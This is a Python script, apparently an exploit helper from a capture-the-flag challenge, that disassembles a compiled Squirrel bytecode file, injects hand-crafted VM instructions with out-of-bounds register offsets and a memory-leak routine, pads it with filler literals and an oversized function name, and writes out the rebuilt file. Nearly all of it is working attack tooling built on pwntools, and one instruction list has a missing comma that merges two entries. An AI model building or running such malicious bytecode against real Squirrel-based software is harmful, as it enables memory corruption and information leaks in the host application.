#!/usr/bin/env python3
from definitions import *
from huepy import *
from pwn import *

import struct

import disassembler as dis
import assembler as ass



LITERALS = []
INSTRUCTIONS = []

def getFile(filename):
    global LITERALS, INSTRUCTIONS
    dis.parseFile(filename)

    LITERALS, INSTRUCTIONS = dis.disassemble(dis.ALL_FUNCTIONS[0])
    INSTRUCTIONS = INSTRUCTIONS[:-1] # no return


def applyPatches(instructions, literals):
    global LITERALS, INSTRUCTIONS

    [LITERALS.append(x) for x in literals]
    [INSTRUCTIONS.append(x) for x in instructions]

def rebuild(filename):
    ass.INSTRUCTIONS = INSTRUCTIONS
    ass.LITERALS = LITERALS

    outfile = ass.SQCnut(filename)
    mainFunc = ass.SQFunction('A'*1024*50, len(LITERALS), len(INSTRUCTIONS))
    mainFunc.addInstructions(INSTRUCTIONS)
    mainFunc.addLiterals(LITERALS)

    outfile.addFunction(mainFunc)

    outfile.build()


def main():

    literals_1 = [

    ]

    instructions_1 = [
        '[0x12] _OP_LOADNULLS:  0x00, 0x01, 0x00, 0x00',
        '[0x12] _OP_LOAD:       0x00, 0x%x, 0x00, 0x00' % ((0x22990+0x4e00) >> 4),
        '[0x00] _OP_GET:        '
        '[0x00] _OP_RETURN:     0xff, 0x00, 0x00, 0x00',
    ]


    # Code: 
    # for(local i=7; i>=0; i--) {
    # printClosure += tmp[i];
    #     if(i != 0) {
    #         printClosure = printClosure << 8;
    #     }
    # }
    # expects the tmp string at 0x6
    readLeak_INS = [
        '[0x30] _OP_LOADINT:    0x7, 0x7, 0x0, 0x0',
        '[0x31] _OP_LOADINT:    0x8, 0x0, 0x0, 0x0',
        '[0x32] _OP_JCMP:       0x8, 0x9, 0x7, 0x2',
        '[0x33] _OP_GET:        0x8, 0x6, 0x7, 0x0',
        '[0x34] _OP_ADD:        0x5, 0x8, 0x5, 0x0',
        '[0x35] _OP_LOADINT:    0x8, 0x0, 0x0, 0x0',
        '[0x36] _OP_NE:         0x8, 0x8, 0x7, 0x0',
        '[0x37] _OP_JZ:         0x8, 0x2, 0x0, 0x0',
        '[0x38] _OP_LOADINT:    0x8, 0x8, 0x0, 0x0',
        '[0x39] _OP_BITW:       0x5, 0x8, 0x5, 0x4',
        '[0x3a] _OP_PINCL:      0x8, 0x7, 0x0, 0xff',
        '[0x3b] _OP_JMP:        0x0, -0xb, 0x0, 0x0',
    ]


    p_literals = [
        0x50505050, 0x50505050, 0x50505050, 0x50505050, 
        0x50505050, 0x50505050, 0x50505050, 0x50505050, 
        0x50505050, 0x50505050, 0x50505050, 0x50505050, 
        0x50505050, 
    ]
    
    p_instructions = [
        '[0x12] _OP_LOADNULLS:  0x00, 0x01, 0x00, 0x00',
        '[0x12] _OP_MOVE:       0x00, 0x%x, 0x00, 0x00' % ((0x22990+0x4e00) >> 4),
        '[0x00] _OP_RETURN:     0xff, 0x00, 0x00, 0x00',
    ]

    if len(sys.argv) != 3:
        print(info("usage: ./patcher.py <cnut-infile> <cnut-outfile>"))
        exit(-1)

    print(good("------------------ STARTING PATCHING ------------------"))

    inputfile = sys.argv[1]
    outputfile = sys.argv[2]

    getFile(inputfile)
    print(good("------------------ PARSED INFILE ------------------"))

    applyPatches(p_instructions, p_literals)
    print(good("------------------ PATCHES APPLIED ------------------"))

    rebuild(outputfile)
    print(good("------------------ WROTE OUTFILE ------------------"))


if __name__ == '__main__':
    main()